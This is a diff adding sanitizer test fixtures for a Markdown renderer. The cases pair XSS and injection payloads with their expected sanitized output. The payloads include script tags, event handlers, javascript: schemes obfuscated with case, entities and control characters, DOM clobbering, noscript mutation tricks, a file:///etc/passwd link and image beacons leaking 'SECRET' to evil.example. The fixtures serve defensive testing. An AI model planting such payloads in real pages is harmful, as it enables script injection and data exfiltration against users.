@@ -9,6 +9,656 @@
       "raw_html": "<p>A paragraph before.</p>\n<script>window.__XSS = 1</script>\n<img src=x onerror=\"window.__XSS = 1\">\n",
       "source": "A paragraph before.\n\n<script>window.__XSS = 1</script>\n\n<img src=x onerror=\"window.__XSS = 1\">\n",
       "visible": ""
+    },
+    {
+      "class": "script",
+      "core_html": "<p>Text with  inline.</p>\n",
+      "expect": "removed",
+      "id": "script-inline",
+      "marker": "<script",
+      "raw_html": "<p>Text with <script>window.__XSS = 1</script> inline.</p>\n",
+      "source": "Text with <script>window.__XSS = 1</script> inline.\n",
+      "visible": ""
+    },
+    {
+      "class": "script",
+      "core_html": "<p><span>before after</span> and more text</p>\n",
+      "expect": "removed",
+      "id": "script-split",
+      "marker": "<script",
+      "raw_html": "<p><span>before <script>window.__XSS = 1</script><b>after</b></span> and more text</p>\n",
+      "source": "<span>before <script>window.__XSS = 1</script><b>after</b></span> and more text\n",
+      "visible": ""
+    },
+    {
+      "class": "script",
+      "core_html": "<pre><code class=\"language-&lt;script&gt;window.__XSS\">plain code\n</code></pre>\n",
+      "expect": "open",
+      "id": "script-fence-info",
+      "marker": "language-",
+      "raw_html": "<pre><code class=\"language-&lt;script&gt;window.__XSS\">plain code\n</code></pre>\n",
+      "source": "```<script>window.__XSS = 1</script>\nplain code\n```\n",
+      "visible": ""
+    },
+    {
+      "class": "script",
+      "core_html": "<p><a href=\"https://example.org/\" rel=\"noopener noreferrer\"></a></p>\n",
+      "expect": "removed",
+      "id": "script-link-text",
+      "marker": "<script",
+      "raw_html": "<p><a href=\"https://example.org/\"><script>window.__XSS = 1</script></a></p>\n",
+      "source": "[<script>window.__XSS = 1</script>](https://example.org/)\n",
+      "visible": ""
+    },
+    {
+      "class": "script",
+      "core_html": "<table><thead><tr><th>a</th><th>b</th></tr></thead><tbody>\n<tr><td></td><td>ok</td></tr>\n</tbody></table>\n",
+      "expect": "removed",
+      "id": "script-table-cell",
+      "marker": "<script",
+      "raw_html": "<table><thead><tr><th>a</th><th>b</th></tr></thead><tbody>\n<tr><td><script>window.__XSS = 1</script></td><td>ok</td></tr>\n</tbody></table>\n",
+      "source": "| a | b |\n|---|---|\n| <script>window.__XSS = 1</script> | ok |\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "<p>Look:  here</p>\n",
+      "expect": "removed",
+      "id": "img-onerror",
+      "marker": "onerror",
+      "raw_html": "<p>Look: <img src=x onerror=\"window.__XSS = 1\"> here</p>\n",
+      "source": "Look: <img src=x onerror=\"window.__XSS = 1\"> here\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "<p>Look:  here</p>\n",
+      "expect": "removed",
+      "id": "svg-onload",
+      "marker": "onload",
+      "raw_html": "<p>Look: <svg onload=\"window.__XSS = 1\"></svg> here</p>\n",
+      "source": "Look: <svg onload=\"window.__XSS = 1\"></svg> here\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "text\n",
+      "expect": "removed",
+      "id": "body-onload",
+      "marker": "onload",
+      "raw_html": "<body onload=\"window.__XSS = 1\">text</body>\n",
+      "source": "<body onload=\"window.__XSS = 1\">text</body>\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "sumbody\n",
+      "expect": "removed",
+      "id": "details-ontoggle",
+      "marker": "ontoggle",
+      "raw_html": "<details open ontoggle=\"window.__XSS = 1\"><summary>sum</summary>body</details>\n",
+      "source": "<details open ontoggle=\"window.__XSS = 1\"><summary>sum</summary>body</details>\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "<input type=\"checkbox\" disabled=\"\">\n",
+      "expect": "removed",
+      "id": "input-onfocus",
+      "marker": "onfocus",
+      "raw_html": "<input autofocus onfocus=\"window.__XSS = 1\">\n",
+      "source": "<input autofocus onfocus=\"window.__XSS = 1\">\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "<p><a href=\"https://example.org/\" rel=\"noopener noreferrer\">x</a></p>\n",
+      "expect": "removed",
+      "id": "anchor-onclick",
+      "marker": "onclick",
+      "raw_html": "<p><a href=\"https://example.org/\" onclick=\"window.__XSS = 1\">x</a></p>\n",
+      "source": "<a href=\"https://example.org/\" onclick=\"window.__XSS = 1\">x</a>\n",
+      "visible": ""
+    },
+    {
+      "class": "handler",
+      "core_html": "<div>cover</div>\n",
+      "expect": "removed",
+      "id": "div-onmouseover",
+      "marker": "onmouseover",
+      "raw_html": "<div onmouseover=\"window.__XSS = 1\" style=\"position:fixed;inset:0\">cover</div>\n",
+      "source": "<div onmouseover=\"window.__XSS = 1\" style=\"position:fixed;inset:0\">cover</div>\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-plain",
+      "marker": "href=\"javascript:",
+      "raw_html": "<p><a href=\"javascript:window.__XSS=1\">click</a></p>\n",
+      "source": "[click](javascript:window.__XSS=1)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-mixed-case",
+      "marker": "href=\"JaVaScRiPt:",
+      "raw_html": "<p><a href=\"JaVaScRiPt:window.__XSS=1\">click</a></p>\n",
+      "source": "[click](JaVaScRiPt:window.__XSS=1)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-tab-inside",
+      "marker": "java&#9;script:",
+      "raw_html": "<p><a href=\"java&#9;script:window.__XSS=1\">click</a></p>\n",
+      "source": "<a href=\"java&#9;script:window.__XSS=1\">click</a>\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-entity",
+      "marker": "href=\"javascript:",
+      "raw_html": "<p><a href=\"javascript:window.__XSS=1\">click</a></p>\n",
+      "source": "[click](javascript&#58;window.__XSS=1)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-leading-control",
+      "marker": "&#1;javascript:",
+      "raw_html": "<p><a href=\"&#1;javascript:window.__XSS=1\">click</a></p>\n",
+      "source": "<a href=\"&#1;javascript:window.__XSS=1\">click</a>\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">javascript:window.__XSS=1</a></p>\n",
+      "expect": "removed",
+      "id": "js-autolink",
+      "marker": "href=\"javascript:",
+      "raw_html": "<p><a href=\"javascript:window.__XSS=1\">javascript:window.__XSS=1</a></p>\n",
+      "source": "<javascript:window.__XSS=1>\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "js-reference",
+      "marker": "href=\"javascript:",
+      "raw_html": "<p><a href=\"javascript:window.__XSS=1\">click</a></p>\n",
+      "source": "[click][r]\n\n[r]: javascript:window.__XSS=1\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "data-html",
+      "marker": "href=\"data:text",
+      "raw_html": "<p><a href=\"data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19YU1M9MTwvc2NyaXB0Pg==\">click</a></p>\n",
+      "source": "[click](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19YU1M9MTwvc2NyaXB0Pg==)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "vbscript",
+      "marker": "href=\"vbscript:",
+      "raw_html": "<p><a href=\"vbscript:msgbox(1)\">click</a></p>\n",
+      "source": "[click](vbscript:msgbox(1))\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "file-url",
+      "marker": "href=\"file:///",
+      "raw_html": "<p><a href=\"file:///etc/passwd\">click</a></p>\n",
+      "source": "[click](file:///etc/passwd)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "removed",
+      "id": "holzfile-token",
+      "marker": "href=\"holzfile:",
+      "raw_html": "<p><a href=\"holzfile:abc123\">click</a></p>\n",
+      "source": "[click](holzfile:abc123)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a href=\"//evil.example/x\" rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "open",
+      "id": "protocol-relative",
+      "marker": "//evil.example",
+      "raw_html": "<p><a href=\"//evil.example/x\">click</a></p>\n",
+      "source": "[click](//evil.example/x)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a href=\"../notes.md\" rel=\"noopener noreferrer\">notes</a></p>\n",
+      "expect": "open",
+      "id": "relative-path",
+      "marker": "../notes.md",
+      "raw_html": "<p><a href=\"../notes.md\">notes</a></p>\n",
+      "source": "[notes](../notes.md)\n",
+      "visible": ""
+    },
+    {
+      "class": "scheme",
+      "core_html": "<p><a href=\"#top\" rel=\"noopener noreferrer\">top</a></p>\n",
+      "expect": "open",
+      "id": "fragment",
+      "marker": "#top",
+      "raw_html": "<p><a href=\"#top\">top</a></p>\n",
+      "source": "[top](#top)\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "remote-image-query",
+      "marker": "<img",
+      "raw_html": "<p><img src=\"https://evil.example/a.png?d=SECRET\" alt=\"x\" /></p>\n",
+      "source": "![x](https://evil.example/a.png?d=SECRET)\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "image-reference",
+      "marker": "<img",
+      "raw_html": "<p><img src=\"https://evil.example/b.png?d=SECRET\" alt=\"x\" /></p>\n",
+      "source": "![x][r]\n\n[r]: https://evil.example/b.png?d=SECRET\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "raw-img-remote",
+      "marker": "<img",
+      "raw_html": "<img src=\"https://evil.example/c.png?d=SECRET\">\n",
+      "source": "<img src=\"https://evil.example/c.png?d=SECRET\">\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "picture-source",
+      "marker": "<picture",
+      "raw_html": "<p><picture><source srcset=\"https://evil.example/d.png\"><img src=\"https://evil.example/e.png\"></picture></p>\n",
+      "source": "<picture><source srcset=\"https://evil.example/d.png\"><img src=\"https://evil.example/e.png\"></picture>\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "video-poster",
+      "marker": "<video",
+      "raw_html": "<p><video poster=\"https://evil.example/p.png\" src=\"https://evil.example/v.mp4\"></video></p>\n",
+      "source": "<video poster=\"https://evil.example/p.png\" src=\"https://evil.example/v.mp4\"></video>\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "svg-image",
+      "marker": "<svg",
+      "raw_html": "<p><svg><image href=\"https://evil.example/i.png\"/></svg></p>\n",
+      "source": "<svg><image href=\"https://evil.example/i.png\"/></svg>\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<input type=\"checkbox\" disabled=\"\">\n",
+      "expect": "removed",
+      "id": "input-image",
+      "marker": "type=\"image\"",
+      "raw_html": "<input type=\"image\" src=\"https://evil.example/f.png\">\n",
+      "source": "<input type=\"image\" src=\"https://evil.example/f.png\">\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "<p>styled</p>\n",
+      "expect": "removed",
+      "id": "css-url-style",
+      "marker": "style=",
+      "raw_html": "<p style=\"background:url(https://evil.example/bg.png)\">styled</p>\n",
+      "source": "<p style=\"background:url(https://evil.example/bg.png)\">styled</p>\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "link-stylesheet",
+      "marker": "<link",
+      "raw_html": "<link rel=\"stylesheet\" href=\"https://evil.example/s.css\">\n",
+      "source": "<link rel=\"stylesheet\" href=\"https://evil.example/s.css\">\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "meta-refresh",
+      "marker": "<meta",
+      "raw_html": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\n",
+      "source": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\n",
+      "visible": ""
+    },
+    {
+      "class": "image",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "base-href",
+      "marker": "<base",
+      "raw_html": "<base href=\"https://evil.example/\">\n",
+      "source": "<base href=\"https://evil.example/\">\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "iframe",
+      "marker": "<iframe",
+      "raw_html": "<iframe src=\"https://evil.example/f\"></iframe>\n",
+      "source": "<iframe src=\"https://evil.example/f\"></iframe>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "object-embed",
+      "marker": "<object",
+      "raw_html": "<p><object data=\"https://evil.example/o\"></object><embed src=\"https://evil.example/e\"></p>\n",
+      "source": "<object data=\"https://evil.example/o\"></object><embed src=\"https://evil.example/e\">\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "go\n",
+      "expect": "removed",
+      "id": "form-formaction",
+      "marker": "<form",
+      "raw_html": "<form action=\"https://evil.example/post\"><button formaction=\"https://evil.example/x\">go</button></form>\n",
+      "source": "<form action=\"https://evil.example/post\"><button formaction=\"https://evil.example/x\">go</button></form>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "math-maction",
+      "marker": "<math",
+      "raw_html": "<p><math><maction actiontype=\"statusline#\" xlink:href=\"javascript:window.__XSS=1\">x</maction></math></p>\n",
+      "source": "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:window.__XSS=1\">x</maction></math>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "<p></p>\n",
+      "expect": "removed",
+      "id": "template",
+      "marker": "<template",
+      "raw_html": "<p><template><img src=x onerror=\"window.__XSS = 1\"></template></p>\n",
+      "source": "<template><img src=x onerror=\"window.__XSS = 1\"></template>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "<p>&lt;p title=\"\"&gt;x</p><p></p>\n",
+      "expect": "removed",
+      "id": "noscript",
+      "marker": "<noscript",
+      "raw_html": "<p><noscript><p title=\"</noscript><img src=x onerror=window.__XSS=1>\">x</p></noscript></p>\n",
+      "source": "<noscript><p title=\"</noscript><img src=x onerror=window.__XSS=1>\">x</p></noscript>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "style-import",
+      "marker": "<style",
+      "raw_html": "<style>@import url(https://evil.example/s.css); p { display: none }</style>\n",
+      "source": "<style>@import url(https://evil.example/s.css); p { display: none }</style>\n",
+      "visible": ""
+    },
+    {
+      "class": "markup",
+      "core_html": "&lt;img src=x onerror=window.__XSS=1&gt;\n",
+      "expect": "removed",
+      "id": "textarea-xmp",
+      "marker": "<textarea",
+      "raw_html": "<textarea></textarea><xmp><img src=x onerror=window.__XSS=1></xmp>\n",
+      "source": "<textarea></textarea><xmp><img src=x onerror=window.__XSS=1></xmp>\n",
+      "visible": ""
+    },
+    {
+      "class": "clobber",
+      "core_html": "<p><a href=\"https://example.org/\" rel=\"noopener noreferrer\">x</a></p>\n",
+      "expect": "removed",
+      "id": "anchor-id",
+      "marker": "id=\"x\"",
+      "raw_html": "<p><a id=\"x\" href=\"https://example.org/\">x</a></p>\n",
+      "source": "<a id=\"x\" href=\"https://example.org/\">x</a>\n",
+      "visible": ""
+    },
+    {
+      "class": "clobber",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "form-name",
+      "marker": "name=\"",
+      "raw_html": "<form name=\"documentElement\"><img name=\"body\"></form>\n",
+      "source": "<form name=\"documentElement\"><img name=\"body\"></form>\n",
+      "visible": ""
+    },
+    {
+      "class": "clobber",
+      "core_html": "\n",
+      "expect": "removed",
+      "id": "img-name",
+      "marker": "name=\"",
+      "raw_html": "<img name=\"querySelector\" src=x>\n",
+      "source": "<img name=\"querySelector\" src=x>\n",
+      "visible": ""
+    },
+    {
+      "class": "clobber",
+      "core_html": "<p>x</p>\n",
+      "expect": "removed",
+      "id": "id-proto",
+      "marker": "id=\"__proto__\"",
+      "raw_html": "<p id=\"__proto__\">x</p>\n",
+      "source": "<p id=\"__proto__\">x</p>\n",
+      "visible": ""
+    },
+    {
+      "class": "nest",
+      "core_html": "<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>x</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n",
+      "expect": "open",
+      "id": "nested-quotes-30",
+      "marker": "<blockquote>",
+      "raw_html": "<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>x</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n",
+      "source": "> > > > > > > > > > > > > > > > > > > > > > > > > > > > > > x\n",
+      "visible": ""
+    },
+    {
+      "class": "nest",
+      "core_html": "<ul>\n<li>item 0\n<ul>\n<li>item 1\n<ul>\n<li>item 2\n<ul>\n<li>item 3\n<ul>\n<li>item 4\n<ul>\n<li>item 5\n<ul>\n<li>item 6\n<ul>\n<li>item 7\n<ul>\n<li>item 8\n<ul>\n<li>item 9\n<ul>\n<li>item 10\n<ul>\n<li>item 11\n<ul>\n<li>item 12\n<ul>\n<li>item 13\n<ul>\n<li>item 14\n<ul>\n<li>item 15\n<ul>\n<li>item 16\n<ul>\n<li>item 17\n<ul>\n<li>item 18\n<ul>\n<li>item 19\n<ul>\n<li>item 20\n<ul>\n<li>item 21\n<ul>\n<li>item 22\n<ul>\n<li>item 23\n<ul>\n<li>item 24\n<ul>\n<li>item 25\n<ul>\n<li>item 26\n<ul>\n<li>item 27\n<ul>\n<li>item 28\n<ul>\n<li>item 29</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n",
+      "expect": "open",
+      "id": "nested-lists-30",
+      "marker": "<ul>",
+      "raw_html": "<ul>\n<li>item 0\n<ul>\n<li>item 1\n<ul>\n<li>item 2\n<ul>\n<li>item 3\n<ul>\n<li>item 4\n<ul>\n<li>item 5\n<ul>\n<li>item 6\n<ul>\n<li>item 7\n<ul>\n<li>item 8\n<ul>\n<li>item 9\n<ul>\n<li>item 10\n<ul>\n<li>item 11\n<ul>\n<li>item 12\n<ul>\n<li>item 13\n<ul>\n<li>item 14\n<ul>\n<li>item 15\n<ul>\n<li>item 16\n<ul>\n<li>item 17\n<ul>\n<li>item 18\n<ul>\n<li>item 19\n<ul>\n<li>item 20\n<ul>\n<li>item 21\n<ul>\n<li>item 22\n<ul>\n<li>item 23\n<ul>\n<li>item 24\n<ul>\n<li>item 25\n<ul>\n<li>item 26\n<ul>\n<li>item 27\n<ul>\n<li>item 28\n<ul>\n<li>item 29</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n",
+      "source": "- item 0\n  - item 1\n    - item 2\n      - item 3\n        - item 4\n          - item 5\n            - item 6\n              - item 7\n                - item 8\n                  - item 9\n                    - item 10\n                      - item 11\n                        - item 12\n                          - item 13\n                            - item 14\n                              - item 15\n                                - item 16\n                                  - item 17\n                                    - item 18\n                                      - item 19\n                                        - item 20\n                                          - item 21\n                                            - item 22\n                                              - item 23\n                                                - item 24\n                                                  - item 25\n                                                    - item 26\n                                                      - item 27\n                                                        - item 28\n                                                          - item 29\n",
+      "visible": ""
+    },
+    {
+      "class": "nest",
+      "core_html": "<table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td><table><tbody><tr><td>x</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>\n",
+      "expect": "open",
+      "id": "nested-tables-20",
+      "marker": "<table>",
+      "raw_html": "<table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td>x</td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table>\n",
+      "source": "<table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td><table><tr><td>x</td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table>\n",
+      "visible": ""
+    },
+    {
+      "class": "nest",
+      "core_html": "<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>word</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n",
+      "expect": "open",
+      "id": "emphasis-run",
+      "marker": "word",
+      "raw_html": "<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>word</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>\n",
+      "source": "********************************************************************************************************************************************************************************************************word********************************************************************************************************************************************************************************************************\n",
+      "visible": ""
+    },
+    {
+      "class": "nest",
+      "core_html": "<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x</p>\n",
+      "expect": "open",
+      "id": "brackets-run",
+      "marker": "[[[[",
